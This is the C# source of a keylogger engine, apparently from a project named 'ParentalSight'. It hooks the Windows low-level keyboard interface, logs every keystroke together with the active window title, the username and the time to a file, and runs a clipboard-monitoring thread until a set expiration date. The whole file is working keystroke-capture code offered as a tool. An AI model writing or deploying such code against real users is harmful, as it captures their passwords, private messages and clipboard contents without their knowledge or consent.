namespace ParentalSight.Keylogger.Engines
{
    using ParentalSight.Keylogger;
    using ParentalSight.Keylogger.Mappers;
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    public class KeyboardLoggerEngine
    {
        private readonly string _logName;

        public KeyboardLoggerEngine(string logName)
        {
            _logName = logName;
            LastTitle = string.Empty;
        }

        public string LastTitle { get; protected set; }

        private string GetUsername() =>
            System.Security.Principal.WindowsIdentity.GetCurrent().Name;

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        // overload for use with LowLevelKeyboardProc
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, WM wParam, [In] KBDLLHOOKSTRUCT lParam);

        // overload for use with LowLevelMouseProc
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, WM wParam, [In] MSLLHOOKSTRUCT lParam);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool PeekMessage(IntPtr lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        //[DllImport("coredll.dll", EntryPoint = "GetModuleHandleW", SetLastError = true)]
        //public static extern IntPtr GetModuleHandle(string moduleName);

        private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);

        private IntPtr CallbackFunction(int code, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                var msgType = wParam.ToInt32();

                if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
                {
                    var shiftState = GetAsyncKeyState(Keys.ShiftKey);
                    var shift = (shiftState & 0x8000) == 0x8000;

                    // read virtual key from buffer
                    var vKey = Marshal.ReadInt32(lParam);

                    // Parse key
                    var key = KeyboardMapper.Instance.ParseKey(vKey, shift, Console.CapsLock);

                    var title = new StringBuilder(256);
                    var hWindow = GetForegroundWindow();
                    GetWindowText(hWindow, title, title.Capacity);

                    var props = new Dictionary<string, string>
                    {
                        {    "Key",                                             key },
                        {   "Time", DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt") },
                        { "Window",                                title.ToString() },
                    };

                    if (props["Window"] != LastTitle)
                    {
                        string titleString = "User    : " + GetUsername() + Environment.NewLine +
                                             "Window  : " + props["Window"] + Environment.NewLine +
                                             "Time    : " + props["Time"] + Environment.NewLine +
                                             "LogFile : " + _logName + Environment.NewLine +
                                             "----------------------------------------------";
                        Trace.WriteLine("");
                        Trace.WriteLine("");
                        Trace.WriteLine(titleString);
                        Trace.WriteLine("");
                        // Write to file
                        LastTitle = props["Window"];
                    }

                    Trace.Write(props["Key"]);
                    // log to file here
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error in CallbackFunction: {0}", ex.Message);
                Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
            }

            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }

        private static void BootClipboard()
        {
            Application.Run(new ClipboardNotification.NotificationForm());
        }

        public void StartKeylogger(DateTime expiration)
        {
            Console.WriteLine("Starting keylogger...");
            try
            {
                Trace.Listeners.Clear();
                using (var twtl = new TextWriterTraceListener(_logName))
                {
                    twtl.Name = "TextLogger";
                    twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;

                    using (var ctl = new ConsoleTraceListener(false))
                    {

                        ctl.TraceOutputOptions = TraceOptions.DateTime;

                        Trace.Listeners.Add(twtl);
                        Trace.Listeners.Add(ctl);
                        Trace.AutoFlush = true;

                        // Start the clipboard
                        ThreadStart clipboardThreadStart = new ThreadStart(BootClipboard);
                        Thread clipboardThread = new Thread(clipboardThreadStart);
                        clipboardThread.Start();

                        //Application.Run(new ClipboardNotification.NotificationForm());
                        HookProc callback = CallbackFunction;
                        var module = Process.GetCurrentProcess().MainModule.ModuleName;
                        var moduleHandle = GetModuleHandle(module);
                        var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);

                        while (DateTime.Now < expiration)
                        {
                            PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                            Thread.Sleep(5);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex.Message);
                Console.WriteLine("[X] Stack Trace: {0}", ex.StackTrace);
                Console.WriteLine("\n[*] Log name for last session: {0}", _logName);
            }
        }
    }
}